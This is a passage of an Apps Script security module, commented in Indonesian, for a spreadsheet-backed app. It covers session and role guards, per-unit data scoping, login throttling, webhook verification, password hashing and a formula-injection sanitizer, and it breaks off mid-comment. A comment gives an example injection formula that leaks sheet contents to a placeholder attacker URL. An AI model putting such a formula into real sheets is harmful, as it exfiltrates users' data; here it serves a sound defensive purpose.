/* ============================================================================
   Guard.js — Lapisan otentikasi, otorisasi, dan kebersihan data SiSi
   Dibuat 29 Agu 2026
   ----------------------------------------------------------------------------
   LATAR BELAKANG
   appsscript.json memakai executeAs: USER_DEPLOYING + access: ANYONE_ANONYMOUS.
   Akibatnya setiap fungsi top-level di proyek ini bisa dipanggil oleh siapa pun
   yang bisa memuat halaman web app (lewat google.script.run), dan berjalan
   sebagai owner script sehingga melewati ACL sharing spreadsheet.
   Nama berawalan/berakhiran underscore TIDAK memberi perlindungan apa pun.

   Karena itu keamanan harus ditegakkan di dalam setiap fungsi, dan cukup dengan
   SATU baris di awal fungsi:

       function setApprovalP0(params) {
         var g = guard_(arguments, { role: ["SUPER", "ADMIN", "YANDAL"], ulp: true });
         params.username = g.username;      // identitas dari SESI, bukan klien
         ...

   CATATAN PENTING
   • Tidak ada satupun bagian file ini yang mengubah struktur sheet.
     Kolom, urutan kolom, dan nama sheet tidak disentuh.
   • File ini tidak mengandung rahasia. Semua nilai rahasia dibaca dari
     Script Properties pada saat diperlukan.
   ========================================================================= */

/* ── Konstanta ───────────────────────────────────────────────────────────── */

var GUARD_DEBUG = true;

/* Peran kanonik. Nilai di db_Users tidak konsisten ("Super User", "Admin",
   "admin", "super user"), jadi dinormalisasi sebelum dibandingkan. */
var ROLE_SUPER = "SUPER";
var ROLE_ADMIN = "ADMIN";

/* Ambang throttling login. Kunci dibatasi per username. */
var LOGIN_GAGAL_JENDELA_DETIK = 15 * 60; // jendela hitungan gagal
var LOGIN_KUNCI = [
  { gagal: 20, detik: 24 * 60 * 60 },
  { gagal: 10, detik: 30 * 60 },
  { gagal: 5, detik: 5 * 60 },
];

/* Prefix penanda password yang sudah di-hash. Nilai lawas (plaintext) tetap
   diterima supaya tidak ada user terkunci, lalu di-upgrade otomatis saat login. */
var PW_HASH_PREFIX = "sisi1$";
var PROP_PW_PEPPER = "SISI_PW_PEPPER";

/* ── Util dasar ──────────────────────────────────────────────────────────── */

function _guardTeks_(v) {
  return String(v == null ? "" : v).trim();
}

function _guardKecil_(v) {
  return _guardTeks_(v).toLowerCase();
}

/** Samakan bentuk ULP agar "ULP Toboali", "ulp toboali", "ULP  Toboali" setara. */
function _normUlp_(v) {
  return _guardKecil_(v).replace(/\s+/g, " ");
}

function ulpSama_(a, b) {
  var x = _normUlp_(a);
  var y = _normUlp_(b);
  return !!x && x === y;
}

/** Normalisasi peran db_Users ke bentuk kanonik. */
function _normRole_(role) {
  var r = _guardKecil_(role).replace(/[\s_-]+/g, "");
  if (r === "superuser" || r === "super") return ROLE_SUPER;
  if (r === "admin" || r === "administrator") return ROLE_ADMIN;
  return _guardTeks_(role).toUpperCase();
}

/* ── Ekstraksi token ─────────────────────────────────────────────────────── */

/* Token sesi dibuat dengan Utilities.getUuid() (Code.js:1082), jadi bentuknya
   UUID. Pola ini dipakai agar guard_ bisa dipasang ke fungsi ber-argumen posisi
   maupun fungsi ber-payload object tanpa mengubah signature klien. */
var TOKEN_POLA = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;

function _tokenDariArgs_(args) {
  if (!args) return "";

  /* Terima dua bentuk pemanggilan:
       guard_(arguments, opts)      —— bentuk yang dianjurkan
       guard_({token: t}, opts)     —— kalau ada yang salah pasang
     Tanpa penyesuaian ini, bentuk kedua diam-diam mengembalikan "" karena
     object tidak punya length, dan guard_ akan menolak semua orang. */
  var list;
  if (typeof args.length === "number") {
    list = [];
    for (var k = 0; k < args.length; k++) list.push(args[k]);
  } else {
    list = [args];
  }

  for (var i = 0; i < list.length; i++) {
    var a = list[i];
    if (!a) continue;
    if (typeof a === "string") {
      if (TOKEN_POLA.test(a.trim())) return a.trim();
      continue;
    }
    if (typeof a === "object") {
      var t = a.token != null ? a.token : a.deviceToken != null ? a.deviceToken : "";
      if (_guardTeks_(t)) return _guardTeks_(t);
    }
  }
  return "";
}

/* ── Audit ───────────────────────────────────────────────────────────────── */

/* Mengapa console.log dan bukan sheet: menambah sheet berarti mengubah struktur
   database, dan exceptionLogging: STACKDRIVER sudah aktif di appsscript.json
   sehingga console.log langsung masuk Cloud Logging dan bisa dicari. */
function audit_(sesi, aksi, objek, hasil, catatan) {
  try {
    var entri = {
      audit: true,
      at: new Date().toISOString(),
      user: sesi ? _guardTeks_(sesi.username) : "",
      role: sesi ? _guardTeks_(sesi.role) : "",
      ulp: sesi ? _guardTeks_(sesi.ulp) : "",
      aksi: String(aksi || ""),
      objek: String(objek == null ? "" : objek).slice(0, 120),
      hasil: String(hasil || ""),
      catatan: String(catatan == null ? "" : catatan).slice(0, 200),
    };
    console.log(JSON.stringify(entri));
  } catch (e) {
    try {
      Logger.log("audit_ gagal: " + e.message);
    } catch (e2) {}
  }
}

/* ── Sesi ────────────────────────────────────────────────────────────────── */

/**
 * Ambil sesi dari argumen. Melempar Error bila tidak ada atau tidak valid.
 * Dipakai ketika cukup "harus login", tanpa syarat peran/ULP tertentu.
 */
function requireSesi_(args) {
  var token = _tokenDariArgs_(args);
  if (!token) {
    audit_(null, "SESI", "", "TOLAK", "tidak ada token");
    throw new Error("Sesi tidak ditemukan. Silakan login ulang.");
  }
  if (typeof getSesiByToken !== "function") {
    throw new Error(
      "getSesiByToken tidak tersedia — Code.js belum terpasang. " +
        "Jangan deploy tanpa Code.js.",
    );
  }
  var sesi = getSesiByToken(token);
  if (!sesi) {
    audit_(null, "SESI", "", "TOLAK", "token tidak dikenal");
    throw new Error("Sesi habis atau tidak valid. Silakan login ulang.");
  }
  return sesi;
}

/**
 * Gerbang utama. Panggil sebagai statement pertama di fungsi yang boleh
 * diakses pengguna.
 *
 * @param {Object} args   —— selalu kirim `arguments` dari fungsi pemanggil.
 * @param {Object} opts
 *   opts.role   {string[]} peran kanonik yang diizinkan. SUPER selalu lolos
 *                          kecuali opts.superTidakBypass = true.
 *   opts.ulp    {boolean} true = wajib punya ULP. ULP kosong -> DITOLAK
 *                          (fail-closed), bukan dilewati filternya.
 *   opts.bidang {string[]} batasi bidang.
 *   opts.tim    {string[]} batasi tim.
 *   opts.aksi   {string}   nama aksi untuk audit log.
 * @return {Object} { sesi, token, username, email, role, roleAsli, isSuper,
 *                    isAdmin, ulp, kodeUlp, ulpKey, bidang, tim, subTim,
 *                    aksesMenu }
 */
function guard_(args, opts) {
  opts = opts || {};
  var aksi = String(opts.aksi || opts.action || "");
  var sesi = requireSesi_(args);

  var roleAsli = _guardTeks_(sesi.role);
  var role = _normRole_(roleAsli);
  var isSuper = role === ROLE_SUPER;
  var isAdmin = role === ROLE_ADMIN;

  var ulp = _guardTeks_(sesi.ulp);
  var kodeUlp = _guardTeks_(sesi.kodeUlp);
  var bidang = _guardTeks_(sesi.bidang);
  var tim = _guardTeks_(sesi.tim);
  var subTim = _guardTeks_(sesi.subTim);

  var g = {
    sesi: sesi,
    token: _tokenDariArgs_(args),
    username: _guardTeks_(sesi.username),
    email: _guardTeks_(sesi.email),
    role: role,
    roleAsli: roleAsli,
    isSuper: isSuper,
    isAdmin: isAdmin,
    ulp: ulp,
    kodeUlp: kodeUlp,
    ulpKey: _normUlp_(kodeUlp || ulp),
    bidang: bidang,
    tim: tim,
    subTim: subTim,
    aksesMenu: _guardTeks_(sesi.aksesMenu),
  };

  /* --- peran --- */
  if (opts.role && opts.role.length) {
    var diizinkan = opts.superTidakBypass !== true && isSuper;
    if (!diizinkan) {
      for (var i = 0; i < opts.role.length; i++) {
        if (_normRole_(opts.role[i]) === role) {
          diizinkan = true;
          break;
        }
      }
    }
    if (!diizinkan) {
      audit_(sesi, aksi || "AKSES", "", "TOLAK", "peran tidak diizinkan: " + roleAsli);
      throw new Error("Akses ditolak. Peran Anda (" + roleAsli + ") tidak berhak.");
    }
  }

  /* --- ULP: FAIL-CLOSED --- */
  if (opts.ulp === true && !g.ulpKey) {
    audit_(sesi, aksi || "AKSES", "", "TOLAK", "akun tanpa ULP");
    throw new Error(
      "Akun belum terhubung ke ULP. Hubungi Super User untuk melengkapi data akun.",
    );
  }

  /* --- bidang / tim --- */
  if (opts.bidang && opts.bidang.length && !isSuper) {
    if (!_guardCocok_(bidang, opts.bidang)) {
      audit_(sesi, aksi || "AKSES", "", "TOLAK", "bidang tidak cocok: " + bidang);
      throw new Error("Akses ditolak untuk bidang Anda.");
    }
  }
  if (opts.tim && opts.tim.length && !isSuper) {
    if (!_guardCocok_(tim, opts.tim) && !_guardCocok_(subTim, opts.tim)) {
      audit_(sesi, aksi || "AKSES", "", "TOLAK", "tim tidak cocok: " + tim);
      throw new Error("Akses ditolak untuk tim Anda.");
    }
  }

  if (aksi) audit_(sesi, aksi, "", "IZINKAN", "");
  return g;
}

function _guardCocok_(nilai, daftar) {
  var n = _guardKecil_(nilai);
  for (var i = 0; i < daftar.length; i++) {
    if (_guardKecil_(daftar[i]) === n) return true;
  }
  return false;
}

/**
 * Untuk fungsi yang cuma boleh dipanggil trigger waktu / jadwal, bukan dari UI.
 * Tidak bisa membedakan asal panggilan di Apps Script, jadi yang dilakukan:
 * menolak bila pemanggil menyelipkan token sesi (tanda dipanggil dari UI),
 * dan mencatat audit. Fungsi yang merusak data sebaiknya TETAP memakai guard_
 * dengan peran SUPER, bukan guardInternal_.
 */
function guardInternal_(args, nama) {
  var token = _tokenDariArgs_(args);
  if (token) {
    audit_(null, "INTERNAL", String(nama || ""), "TOLAK", "dipanggil dengan token sesi");
    throw new Error("Fungsi ini hanya untuk trigger terjadwal, bukan untuk pengguna.");
  }
  if (GUARD_DEBUG) {
    audit_(null, "INTERNAL", String(nama || ""), "JALAN", "trigger");
  }
  return null;
}

/**
 * Hanya Super User yang boleh menjangkau data lintas ULP.
 *
 * Kebijakan (diputuskan 29 Agu 2026): Admin DIBATASI ke ULP-nya sendiri.
 * Sebelumnya "admin" dipakai sebagai bypass lintas ULP di
 * Teknik-TO-Mobile.js:19, WO-ROW-Mobile.js:18, dan Master-Gardu-Sync-Mobile.js:13,
 * sementara _assertSuperUser menolak "admin" — jadi dua modul bisa memberi
 * Admin hak yang ditolak modul lain. Sekarang satu sumber kebenaran.
 */
function bolehLintasUlp_(g) {
  return !!(g && g.isSuper);
}

/**
 * Ambil ULP yang boleh dipakai untuk memfilter data.
 * Super User boleh meminta ULP tertentu (atau "" = semua). SEMUA peran lain,
 * termasuk Admin, SELALU dipaksa ke ULP miliknya sendiri — nilai `diminta`
 * dari klien diabaikan. Ini menutup celah "kirim ulp orang lain" (IDOR).
 */
function ulpScope_(g, diminta) {
  if (!g) throw new Error("ulpScope_ butuh hasil guard_.");
  if (bolehLintasUlp_(g)) {
    var m = _guardTeks_(diminta);
    return m ? m : "";
  }
  return g.ulp;
}

/* Baris lama yang kolom ULP-nya masih kosong:
     true  = tetap tampil untuk semua ULP  -> kompatibel mundur, tidak ada data
             yang tiba-tiba hilang setelah pembaruan ini
     false = hanya tampil untuk Super User -> ketat
   Setelah dipastikan seluruh baris sudah terisi ULP, ubah ke false.
   Satu-satunya tempat yang perlu diubah. */
var TAMPILKAN_BARIS_TANPA_ULP = true;

/**
 * Apakah satu baris sheet boleh dilihat oleh pemilik sesi `g`?
 *
 * Dipakai di semua modul yang membaca sheet ber-ULP, supaya aturan "Admin
 * dibatasi ke ULP sendiri" tidak perlu ditulis berulang-ulang.
 *
 * @param {Object} g         hasil guard_
 * @param {*}      ulpBaris  isi kolom ULP pada baris tersebut
 */
function barisUlpCocok_(g, ulpBaris) {
  if (!g) return false;
  var baris = _normUlp_(ulpBaris);
  if (!baris) return TAMPILKAN_BARIS_TANPA_ULP;
  if (bolehLintasUlp_(g)) return true;

  var punya = _normUlp_(g.ulp);
  if (!punya) return false; // fail-closed: sesi tanpa ULP tidak melihat apa pun
  if (baris === punya) return true;

  var kode = _normUlp_(g.kodeUlp);
  return !!kode && baris === kode;
}

/* Cache ringan per eksekusi: pencarian ULP header dipanggil berulang kali
   di modul inspeksi. Apps Script tidak punya memori lintas eksekusi, jadi
   cache ini hanya berlaku untuk satu pemanggilan fungsi. */
var _ulpHeaderMemo_ = null;

/* Peta ULP per Kode Header, diisi sekali per eksekusi. Menghindari pembacaan
   sheet berulang pada loop panjang. */
var _petaUlpHeader_ = null;

/**
 * Bangun peta { kodeHeader -> ULP } dari db_Global_Header.
 * Dipakai modul yang memeriksa kepemilikan banyak baris sekaligus.
 */
function petaUlpHeader_() {
  if (_petaUlpHeader_) return _petaUlpHeader_;
  var peta = {};
  try {
    var ss = SpreadsheetApp.openById(SPREADSHEET_ID);
    var sh = ss.getSheetByName("db_Global_Header");
    if (sh && sh.getLastRow() > 1) {
      var data = sh.getRange(2, 1, sh.getLastRow() - 1, 3).getValues();
      for (var i = 0; i < data.length; i++) {
        var kh = _guardTeks_(data[i][1]);
        if (kh && peta[kh] === undefined) peta[kh] = _guardTeks_(data[i][2]);
      }
    }
  } catch (e) {}
  _petaUlpHeader_ = peta;
  return peta;
}

/**
 * Ambil ULP pemilik satu Kode Header dari db_Global_Header.
 *
 * Dibutuhkan karena sebagian sheet anak (mis. db_InsDu_Realisasi) TIDAK punya
 * kolom ULP sendiri — kepemilikan baris hanya bisa ditelusuri lewat
 * kodeHeader induknya. Tanpa ini, pemeriksaan kepemilikan pada sheet anak
 *
 * @return {string} ULP, atau "" bila header tidak ditemukan (pemanggil yang
 *                  menentukan apakah "" berarti boleh atau ditolak —
 *                  barisUlpCocok_() menganggap "" sebagai "tampilkan" demi
 *                  kompatibel mundur).
 */
function ulpDariKodeHeader_(kodeHeader) {
  var kh = _guardTeks_(kodeHeader);
  if (!kh) return "";
  if (_ulpHeaderMemo_ && _ulpHeaderMemo_.kh === kh) return _ulpHeaderMemo_.ulp;

  var ulp = "";
  try {
    var ss = SpreadsheetApp.openById(SPREADSHEET_ID);
    var sh = ss.getSheetByName("db_Global_Header");
    if (!sh) {
      var semua = ss.getSheets();
      for (var s = 0; s < semua.length; s++) {
        var n = String(semua[s].getName() || "").trim().toLowerCase();
        if (n === "db_global_header" || n === "global_header" || n === "db_header") {
          sh = semua[s];
          break;
        }
      }
    }
    if (sh && sh.getLastRow() > 1) {
      /* Cukup baca 3 kolom pertama: No, Kode Header, ULP. */
      var data = sh.getRange(2, 1, sh.getLastRow() - 1, 3).getValues();
      for (var i = data.length - 1; i >= 0; i--) {
        if (_guardTeks_(data[i][1]) === kh) {
          ulp = _guardTeks_(data[i][2]);
          break;
        }
      }
    }
  } catch (e) {
    ulp = "";
  }
  _ulpHeaderMemo_ = { kh: kh, ulp: ulp };
  return ulp;
}

/**
 * Sudahkah `g` punya salah satu peran ini?
 * Dipakai untuk percabangan (bukan penolakan) di dalam fungsi.
 */
function rolePunya_(g, daftar) {
  if (!g || !daftar || !daftar.length) return false;
  if (g.isSuper) return true;
  for (var i = 0; i < daftar.length; i++) {
    if (_normRole_(daftar[i]) === g.role) return true;
  }
  return false;
}

/* ── Penegakan Super User ────────────────────────────────────────────────── */

/* Peran yang dianggap Super User.
   ADMIN sengaja TIDAK termasuk: Admin boleh mengelola data operasional, tetapi
   tidak boleh menambah / mengubah / menghapus akun pengguna. Kalau kebijakan
   ini kelak diubah, cukup di sini — tidak perlu menyentuh 26 file.

   Catatan inkonsistensi lama (K13): _assertSuperUser di Code.js hanya menerima
   exact "Super User", sedangkan Teknik-TO-Mobile.js:19, WO-ROW-Mobile.js:18,
   dan Master-Gardu-Sync-Mobile.js:13 menerima "admin" sebagai bypass lintas
   ULP. Nilai itu sekarang dinormalisasi lewat _normRole_ sehingga perbandingan
   di semua modul konsisten. */
var PERAN_SUPER_USER = ["SUPER"];

/**
 * Pengganti yang FAIL-CLOSED untuk pola lama:
 *     if (typeof _assertSuperUser === "function") _assertSuperUser(token);
 * Pola itu melewatkan pemeriksaan sama sekali kalau Code.js gagal dimuat —
 * padahal daftarPerangkat() mengembalikan deviceToken semua pengguna.
 */
function _assertSuperUserKetat_(token) {
  if (typeof _assertSuperUser !== "function") {
    audit_(null, "SUPER_USER", "", "TOLAK", "_assertSuperUser tidak tersedia");
    throw new Error(
      "Modul otorisasi tidak tersedia (Code.js belum terpasang). " +
        "Akses ditolak demi keamanan. Jangan deploy tanpa Code.js.",
    );
  }
  return _assertSuperUser(token);
}

/**
 * Apakah hasil guard_ berhak mengelola akun?
 * Dipakai untuk percabangan, bukan penolakan.
 */
function bolehKelolaAkun_(g) {
  if (!g) return false;
  for (var i = 0; i < PERAN_SUPER_USER.length; i++) {
    if (_normRole_(PERAN_SUPER_USER[i]) === g.role) return true;
  }
  return false;
}

/**
 * Apakah error ini kegagalan OTORISASI (bukan kegagalan data)?
 *
 * Banyak fungsi di proyek ini membungkus seluruh isinya dalam try/catch lalu
 * "jatuh" ke jalur lain kalau gagal. Itu berbahaya kalau yang gagal justru
 * pemeriksaan akses: penolakan berubah wujud menjadi seolah-olah "data error",
 * dan kode mencoba jalur lain yang mungkin tidak punya pemeriksaan yang sama.
 * Pakai helper ini di blok catch untuk membedakan keduanya.
 */
function _guardErrorAkses_(e) {
  var m = String((e && e.message) || "");
  return (
    /Sesi (habis|tidak)/i.test(m) ||
    /Akses ditolak/i.test(m) ||
    /belum terhubung ke ULP/i.test(m) ||
    /bukan milik/i.test(m) ||
    /LOCK_SIBUK/.test(m) ||
    /hanya untuk trigger/i.test(m)
  );
}

/* ── Kebersihan nilai sel (formula / CSV injection) ──────────────────────── */

/**
 * LINDUNGI SEBELUM MENULIS KE SHEET.
 * Google Sheets mengevaluasi nilai yang diawali = + - @ sebagai formula.
 * Tanpa ini, teks bebas dari pengguna (deskripsi, catatan, alasan, nama
 * pekerjaan) bisa menjadi =IMPORTRANGE(...) atau
 * =HYPERLINK("http://penyerang/?v="&A1,"x") yang mengirim isi sheet keluar
 * begitu ada yang membuka atau mengekspornya.
 *
 * Angka dan tanggal dilewatkan apa adanya; hanya teks yang diubah.
 */
function safeCell_(v) {
  if (v === null || v === undefined) return "";
  if (typeof v === "number" || typeof v === "boolean") return v;
  if (v instanceof Date) return v;
  var s = String(v);
  if (!s) return "";
  var c = s.charAt(0);
  if (c === "=" || c === "+" || c === "-" || c === "@" || c === "\t" || c === "\r") {
    return "'" + s;
  }
  return s;
}

function safeRow_(arr) {
  if (!arr || !arr.length) return arr;
  var out = new Array(arr.length);
  for (var i = 0; i < arr.length; i++) out[i] = safeCell_(arr[i]);
  return out;
}

function safeMatrix_(m) {
  if (!m || !m.length) return m;
  var out = new Array(m.length);
  for (var r = 0; r < m.length; r++) out[r] = safeRow_(m[r] || []);
  return out;
}

/* ── Locking ─────────────────────────────────────────────────────────────── */

/**
 * Bungkus operasi baca-modifikasi-tulis agar dua proses paralel tidak
 * menghasilkan nomor urut ganda atau menimpa baris yang sama.
 * Contoh: _generateKodeEksekusiRow() menghitung nomor lalu menulis; tanpa lock
 * dua input bersamaan menghasilkan kode eksekusi kembar.
 *
 * Melempar Error berkode LOCK_SIBUK bila lock tidak didapat — lebih baik
 * meminta pengguna mengulang daripada menulis data ganda.
 */
function withLock_(fn, ms) {
  var tunggu = typeof ms === "number" ? ms : 10000;
  var lock = LockService.getScriptLock();
  var dapat = false;
  try {
    dapat = lock.tryLock(tunggu);
  } catch (e) {
    dapat = false;
  }
  if (!dapat) {
    var err = new Error(
      "Sistem sedang sibuk memproses data yang sama. Ulangi beberapa saat lagi.",
    );
    err.kode = "LOCK_SIBUK";
    throw err;
  }
  try {
    return fn();
  } finally {
    try {
      lock.releaseLock();
    } catch (e) {}
  }
}

/* ── Throttle login ──────────────────────────────────────────────────────── */

/**
 * Kunci per username disimpan di Script Properties (tahan lama, tidak hilang
 * saat cache dibersihkan). Hitungan gagal di CacheService (jendela 15 menit).
 */
function loginThrottleCek_(username) {
  var u = _guardKecil_(username);
  if (!u) return { boleh: true, sisaDetik: 0 };
  var props = PropertiesService.getScriptProperties();
  var sampai = Number(props.getProperty("lt_lock_" + u) || 0);
  if (!sampai) return { boleh: true, sisaDetik: 0 };
  var sisa = Math.ceil((sampai - Date.now()) / 1000);
  if (sisa <= 0) {
    try {
      props.deleteProperty("lt_lock_" + u);
    } catch (e) {}
    return { boleh: true, sisaDetik: 0 };
  }
  return { boleh: false, sisaDetik: sisa };
}

/** Catat satu percobaan gagal. Mengembalikan info kunci yang aktif. */
function loginThrottleGagal_(username) {
  var u = _guardKecil_(username);
  if (!u) return { boleh: true, sisaDetik: 0, gagal: 0 };
  var cache = CacheService.getScriptCache();
  var key = "lt_fail_" + u;
  var n = Number(cache.get(key) || 0) + 1;
  try {
    cache.put(key, String(n), LOGIN_GAGAL_JENDELA_DETIK);
  } catch (e) {}

  var detik = 0;
  for (var i = 0; i < LOGIN_KUNCI.length; i++) {
    if (n >= LOGIN_KUNCI[i].gagal) {
      detik = LOGIN_KUNCI[i].detik;
      break;
    }
  }
  if (detik > 0) {
    try {
      PropertiesService.getScriptProperties().setProperty(
        "lt_lock_" + u,
        String(Date.now() + detik * 1000),
      );
    } catch (e2) {}
    audit_(null, "LOGIN_GAGAL", u, "KUNCI", n + " kali gagal, kunci " + detik + " detik");
  } else {
    audit_(null, "LOGIN_GAGAL", u, "CATAT", n + " kali gagal");
  }
  return { boleh: detik <= 0, sisaDetik: detik, gagal: n };
}

/** Bersihkan hitungan dan kunci. Dipanggil setelah login berhasil / reset password. */
function loginThrottleReset_(username) {
  var u = _guardKecil_(username);
  if (!u) return;
  try {
    CacheService.getScriptCache().remove("lt_fail_" + u);
  } catch (e) {}
  try {
    PropertiesService.getScriptProperties().deleteProperty("lt_lock_" + u);
  } catch (e2) {}
}

/* ── Webhook AppSheet ────────────────────────────────────────────────────── */

/* Daftar action yang benar-benar dipakai bot AppSheet. Selain ini ditolak.
   Ambil dari rantai if/else di doPost() (Code.js). */
var WEBHOOK_ACTIONS = [
  "recalcRow",
  "recalcWa",
  "refreshWa",
  "validasiFoto",
  "refreshLaporan",
  "prosesShiftYandal",
  "prosesP0Yandal",
  "prosesSwitchingYandal",
  "prosesHartekPG",
  "cekBarisHartekPG",
  "prosesHartekPekerjaan",
  "prosesHartekMaterial",
  "prosesHartekHarGrounding",
  "prosesHartekPemerataanBeban",
  "prosesEksekusiRow",
  "hitungPointP0Yandal",
];

/* Mode pemeriksaan timestamp anti-replay:
     off     — abaikan field ts (keadaan darurat)
     warn    — kalau ts tidak ada/melenceng, catat tapi tetap lanjut (default;
               bot AppSheet belum tentu sudah mengirim ts)
     enforce — wajib ada ts dan harus dalam jendela waktu
   Setelah bot AppSheet dikonfirmasi mengirim ts, ubah property ke "enforce". */
var WEBHOOK_TS_MODE_DEFAULT = "warn";
var WEBHOOK_TS_JENDELA_DETIK = 10 * 60;
var PROP_WEBHOOK_SECRET = "SISI_WEBHOOK_SECRET";
var PROP_WEBHOOK_TS_MODE = "SISI_WEBHOOK_TS_MODE";

function _teksSamaAman_(a, b) {
  var x = String(a == null ? "" : a);
  var y = String(b == null ? "" : b);
  if (x.length !== y.length) return false;
  var beda = 0;
  for (var i = 0; i < x.length; i++) beda |= x.charCodeAt(i) ^ y.charCodeAt(i);
  return beda === 0;
}

/**
 * Secret webhook. Dibaca dari Script Properties supaya tidak berada di kode
 * yang ter-commit. Nilai lama (konstanta WEBHOOK_SECRET di Code.js) tetap
 * dipakai sebagai fallback agar bot AppSheet tidak putus — rotasi cukup dengan
 * mengisi property, tanpa mengubah kode.
 */
function _webhookSecret_() {
  var p = "";
  try {
    p = PropertiesService.getScriptProperties().getProperty(PROP_WEBHOOK_SECRET);
  } catch (e) {}
  p = String(p || "").trim();
  return p;
}

function _webhookTsMode_() {
  var m = "";
  try {
    m = PropertiesService.getScriptProperties().getProperty(PROP_WEBHOOK_TS_MODE);
  } catch (e) {}
  m = String(m || "").trim().toLowerCase();
  if (m === "off" || m === "warn" || m === "enforce") return m;
  return WEBHOOK_TS_MODE_DEFAULT;
}

/**
 * Terima field ts dalam format:
 *   • epoch milidetik  (1756..........)
 *   • epoch detik      (1756......)
 *   • ISO              (2026-08-29T10:00:00Z)
 *   • "yyyy-MM-dd HH:mm:ss"  -> dianggap WIB (UTC+7), sesuai output TEXT(NOW())
 *     di AppSheet yang memakai zona Asia/Jakarta
 * Mengembalikan 0 bila tidak bisa dipahami.
 */
function _webhookTsMs_(v) {
  if (v == null) return 0;
  var s = String(v).trim();
  if (!s) return 0;

  if (/^\d+$/.test(s)) {
    var n = Number(s);
    if (n > 1e14) return 0;
    if (n > 1e12) return n;
    if (n > 1e9) return n * 1000;
    return 0;
  }

  var t = Date.parse(s);
  if (!isNaN(t)) return t;

  var m = s.match(/^(\d{4})-(\d{2})-(\d{2})[ T](\d{2}):(\d{2})(?::(\d{2}))?$/);
  if (m) {
    return Date.UTC(+m[1], +m[2] - 1, +m[3], +m[4] - 7, +m[5], +(m[6] || 0));
  }
  return 0;
}

/**
 * Verifikasi satu request webhook AppSheet.
 *
 * @param {Object} body  hasil JSON.parse(e.postData.contents).
 *                       JANGAN kirim e.parameter ke sini — secret yang dikirim
 *                       lewat query string ikut tercatat di access log.
 * @return {Object} { ok, kode, message }
 */
function webhookVerifikasi_(body) {
  body = body || {};

  var secret = _webhookSecret_();
  if (!secret) {
    audit_(null, "WEBHOOK", "", "TOLAK", "secret belum dikonfigurasi");
    return { ok: false, kode: "SECRET_KOSONG", message: "Secret webhook belum dikonfigurasi." };
  }

  var dikirim = body.secret != null ? body.secret : body.token;
  if (!_teksSamaAman_(dikirim == null ? "" : String(dikirim), secret)) {
    audit_(null, "WEBHOOK", "", "TOLAK", "secret tidak cocok");
    return { ok: false, kode: "SECRET_SALAH", message: "Token webhook tidak valid" };
  }

  var action = String(body.action || "").trim();
  if (WEBHOOK_ACTIONS.indexOf(action) < 0) {
    audit_(null, "WEBHOOK", action, "TOLAK", "action tidak dikenal");
    return {
      ok: false,
      kode: "ACTION_TIDAK_DIKENAL",
      message: "Action webhook tidak dikenal: " + action,
    };
  }

  /* Anti-replay. */
  var mode = _webhookTsMode_();
  if (mode !== "off") {
    var ts = _webhookTsMs_(body.ts);
    var selisih = ts ? Math.abs(Date.now() - ts) / 1000 : -1;
    var valid = ts > 0 && selisih >= 0 && selisih <= WEBHOOK_TS_JENDELA_DETIK;
    if (!valid) {
      audit_(null, "WEBHOOK", action, "REPLAY?",
        "ts=" + String(body.ts == null ? "" : body.ts) + " selisih=" + Math.round(selisih) + "s");
      if (mode === "enforce") {
        return {
          ok: false,
          kode: "TS_TIDAK_VALID",
          message:
            "Field ts wajib diisi dan tidak boleh melenceng lebih dari " +
            WEBHOOK_TS_JENDELA_DETIK / 60 +
            " menit (anti-replay).",
        };
      }
    }
  }

  return { ok: true, kode: "OK", action: action };
}

/* ── Password ────────────────────────────────────────────────────────────── */

/* Pepper disimpan di Script Properties, BUKAN di kode, supaya tidak ikut
   ter-commit. Dibuat otomatis sekali pada pemakaian pertama. */
function _pwPepper_() {
  var props = PropertiesService.getScriptProperties();
  var p = props.getProperty(PROP_PW_PEPPER);
  if (p) return p;
  p = Utilities.getUuid() + Utilities.getUuid();
  props.setProperty(PROP_PW_PEPPER, p);
  return p;
}

function _hex_(bytes) {
  var s = "";
  for (var i = 0; i < bytes.length; i++) {
    var b = (bytes[i] & 0xff).toString(16);
    if (b.length < 2) b = "0" + b;
    s += b;
  }
  return s;
}

/**
 * Hash password. Format tersimpan: sisi1$<salt>$<hmac-sha256 hex>
 * Nilai ini menggantikan isi kolom D db_Users. Struktur sheet tidak berubah —
 * kolom tetap bernama "Password", hanya isinya yang jadi hash.
 */
function _hashPw_(password, salt) {
  var pesan = String(salt) + "|" + String(password == null ? "" : password);
  var sig = Utilities.computeHmacSha256Signature(pesan, _pwPepper_());
  return PW_HASH_PREFIX + salt + "$" + _hex_(sig);
}

function _saltBaru_() {
  return Utilities.getUuid().replace(/-/g, "").substring(0, 16);
}

/** Apakah nilai tersimpan sudah berformat hash? */
function _pwSudahHash_(tersimpan) {
  return _guardTeks_(tersimpan).indexOf(PW_HASH_PREFIX) === 0;
}

/**
 * Verifikasi password dengan DUAL-READ:
 *   • nilai berformat sisi1$... -> verifikasi sebagai hash
 *   • nilai lain                 -> plaintext lawas (masa transisi)
 * Keduanya hidup berdampingan selamanya, jadi tidak ada user yang terkunci
 * kalau migration belum dijalankan untuk barisnya.
 */
function _verifyPw_(tersimpan, dikirim) {
  var s = _guardTeks_(tersimpan);
  var p = String(dikirim == null ? "" : dikirim);
  if (!s || !p) return false;

  if (_pwSudahHash_(s)) {
    var bagian = s.split("$");
    if (bagian.length !== 3) return false;
    var ulang = _hashPw_(p, bagian[1]);
    /* Bandingkan tanpa jalan pintas agar tidak bocor lewat waktu komparasi. */
    if (ulang.length !== s.length) return false;
    var beda = 0;
    for (var i = 0; i < s.length; i++) beda |= s.charCodeAt(i) ^ ulang.charCodeAt(i);
    return beda === 0;
  }
  return s === p;
}

/** True bila password tersimpan masih plaintext dan perlu di-upgrade. */
function _pwPerluUpgrade_(tersimpan) {
  var s = _guardTeks_(tersimpan);
  return !!s && !_pwSudahHash_(s);
}

/**
 * Tulis hash ke baris db_Users. Dipakai migrasi massal dan upgrade otomatis
 * saat login. Mengembalikan true bila ada perubahan.
 */
function _tulisHashPw_(sh, nomorBaris, passwordPlain) {
  var kolom = typeof COL_USERS !== "undefined" && COL_USERS ? COL_USERS.password : 3;
  var salt = _saltBaru_();
  sh.getRange(nomorBaris, kolom + 1, 1, 1).setValue(_hashPw_(passwordPlain, salt));
  return true;
}

/**
 * Upgrade SATU akun dari plaintext ke hash, dipanggil setelah login berhasil.
 * Dipakai doLogin() dan loginPerangkat() supaya akun baru / akun yang ditulis
 * ulang AppSheet ikut ter-hash tanpa perlu menjalankan migrasi massal lagi.
 *
